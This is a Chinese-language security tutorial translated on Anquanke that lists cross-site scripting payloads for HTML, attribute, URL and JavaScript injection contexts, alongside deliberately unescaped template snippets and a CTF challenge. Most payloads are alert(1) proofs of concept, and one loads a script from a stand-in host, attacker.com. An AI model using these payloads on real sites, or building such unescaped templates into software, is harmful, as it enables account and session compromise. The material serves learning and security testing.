# 多种方式执行XSS

阅读量 **330878**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-21 10:55:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01dc6994805c3dce88.jpg)

## 0x00 介绍

​ 在一切用户可控输入的地方，没有过滤输入内容，导致插入html代码，从而导致用户的信息泄露及其它的问题。XSS分为以下几种：

  * 反射型XSS
  * 存储型XSS
  * DOM XSS
  * UXSS([什么是UXSS](https://www.acunetix.com/blog/articles/universal-cross-site-scripting-uxss/))
  * MXSS([什么是MXSS](https://cure53.de/fp170.pdf))

本文就来探究在不同情形下执行XSS的情况。

## 0x01 HTML XSS

HTML XSS 是最常见的一种XSS的情形。例如以下代码：

    
    
    <!DOCTYPE HTML>
    <html>
    <head>
    <title>HTML Context</title>
    </head>
    <body>
    {{userinput}}
    </body>
    </html>
    

这种情形，可以用以下payloads:

    
    
    <script src=//attacker.com/evil.js></script>
    <script>alert(1)</script>
    <svg onload=alert(1)>
    <body onload=alert(1)>
    <iframe onload=alert(1)>
    

为了注入JS代码成功，我们需要闭合前面的HTML标签，然后使用`<svg onload=alert(1)//` 类似payload 就可以成功XSS。

但是有些html标签中不执行js代码，例如：`<title>, <textarea
>,<xmp>`都需要使用`</xmp><script>alert(1)</script>` 先闭合标签，在插入JS代码。

## 0x02 属性 XSS

在这种情形下，用户的输入是在HTML 标签的属性当中的时候，怎么来执行JS 代码。会有三种情况：

  * 双引号
  * 单引号
  * 无引号

就像这样：

    
    
    <!DOCTYPE HTML>
    <html>
    <head>
    <title></title>
    </head>
    <body>
    .....
    ...
    <input type="" name="input" value="{{user input}}"> <!-- 双引号 -->
    <input type="" name="input" value='{{user input}}'> <!-- 单引号 -->
    <input type="" name="input" value={{user input}}> <!-- 无引号 -->
    ...
    ....
    </body>
    </html>
    

1.双引号payloads：

    
    
    "autofocus onfocus="alert(1)
    "autofocus onfocus=alert(1)//
    "onbeforescriptexecute=alert(1)//
    "onmouseover="alert(1)//
    "autofocus onblur="alert(1)
    

2.单引号payloads：

    
    
    'autofocus onfocus='alert(1)
    'autofocus onfocus=alert(1)//
    'onbeforescriptexecute=alert(1)//
    'onmouseover='alert(1)//
    'autofocus onblur='alert(1)
    

3.无引号payloads：

    
    
    aaaa autofocus onfocus=alert(1)//
    aaaa onbeforescriptexecute=alert(1)//
    aaaa onmouseover=alert(1)//
    

在使用这些标签属性的时候，并不是适用于每一个HTML标签，而且有些属性需要与用户的交互。当然也有不会执行JS的标签，例如：<meta>。更多的标签使用，可以查看参考里面的XSS过滤表。

还有些时候，用户的输入是在disabled或者hidden 中。

4.hidden 标签：

​ 1)在onclick事件下，使用accesskey ，所以需要与用户交互。

    
    
    <!DOCTYPE HTML>
    <html>
    ..
    <input type="hidden" value="{{userinput}}" />
    ..
    </html>
    

Payload: `"accesskey="X" onclick="alert(1)"` ，为了触发事件，需要按Alt+SHIFT+X 键。

阿里先知XSS中的一道题：

    
    
    <?php
    header('X-XSS-Protection:0');
    header('Content-Type:text/html;charset=utf-8');
    ?>
    <head>
    <meta http-equiv="x-ua-compatible" content="IE=10">
    </head>
    <body>
    <form action=''>
    <input type='hidden' name='token' value='<?php
      echo htmlspecialchars($_GET['token']); ?>'>
    <input type='submit'>
    </body>
    

Payload: `token='style='behavior:url(?)'onreadystatechange='alert(1)`

​ 2) 如果`type="hidden"` 参数是在后面：

    
    
    <!DOCTYPE HTML>
    <html>
    ..
    <input value="{{userinput}}" type="hidden"/>
    ..
    </html>
    

Payload: `" type=xx autofocus onfocus=alert(1)//`

5.disabled

    
    
    <!DOCTYPE HTML>
    <html>
    ..
    <input disabled value="{{userinput}}" />
    ..
    </html>
    

Payload: `"style="position:fixed;top:0;left:0;border:999em solid red;"
onmouseover="alert(1)` 只有firefox有效。

## 0x03 URL XSS

HTML标签 使用了加载URL的标签。

    
    
    <script src="{{userinput}}"></script>
    
    <a href="{{userinput}}">Click</a>
    
    <iframe src="{{userinput}}" />
    
    <base href="{{userinput}}">
    
    <form action={{userinput}}>
    <button>X</button>
    
    <frameset><frame src="{{userinput}}"></frameset>
    

Payload: `javascript:alert(1)//`

## 0x04 JAVASCRIPT XSS

用户的输入在`<script>` 标签中，从而导致的JS代码执行。

1.

    
    
    <!DOCTYPE HTML>
    <html>
    ..
    <script>
    var x="{{userinput}}";// break out of quotes accordingly if its double or single
    ..
    ...
    </script>
    ..
    </html>
    

Payloads:

    
    
    ";alert(1)//
    "-alert(1)-"
    "+alert(1)+"
    "*alert(1)*"
    

如果没有被转义的话，就可以直接执行JS代码了。

2.

    
    
    <!DOCTYPE HTML>
    <html>
    ..
    <script>
    var x={{userinput}};
    ..
    ...
    </script>
    ..
    </html>
    

Payloads:

    
    
    alert(1);
    1-alert(1);
    alert(1)//
    

我们要做的就是保持插入的代码在JS代码中不会有语法的错误，这样才能保证我们Payload 的正确执行。

3.

    
    
    <!DOCTYPE HTML>
    <html>
    ..
    <script>
    var x=123;
    function test(){
    
    if(test =='{{userinput}}'){
    //something
    }
    else
    {
    //something
    }
    }
    test();
    </script>
    ..
    </html>
    

首先用 `test'){//` 封闭条件判断的地方，变成：

    
    
    function test(){
    
    if(test =='test'){//'){
    //something
    }
    else
    {
    //something
    }
    }
    

但是这样只有在调用test()才能执行，所以我们要跳出这个函数输入：`test'){1}}//` 封闭test()函数：

    
    
    function test(){
    
    if(test =='test'){1}}//'){
    //something
    }
    else
    {
    //something
    }
    }
    

我们在使用`test'){1}};alert(1);function test1(){ if(1){//` 把对应的test位置替换下，利用test1
来封闭剩下的函数，但是这样执行会有错误，我们使用ES6的箭头函数来替代`function` :

    
    
    function test(){
    
    if(test =='test'){1}};alert(1);test1=>{ if(1){//'){1}}//'){
    //something
    }
    else
    {
    //something
    }
    }
    

格式化后：

![](https://p4.ssl.qhimg.com/t01f3a896da2810badb.png)

当然了这些XSS代码都是一些示例，大佬可以无视哦，实际中的话还跟浏览器的处理还有很大的关系，以及网页设置的编码等。

## 0x05 参考

    
    
    https://github.com/Metnew/uxss-db
    
    https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
    
    https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet (xss 过滤速查表)
    

审核人：yiwang 编辑：边边

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **anw2** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/148357](/post/id/148357)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [技术分析](/tag/技术分析)
  * [安全研究](/tag/安全研究)
  * [XSS攻击](/tag/XSS攻击)

 **+1** __5赞

 __收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg) anw2

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

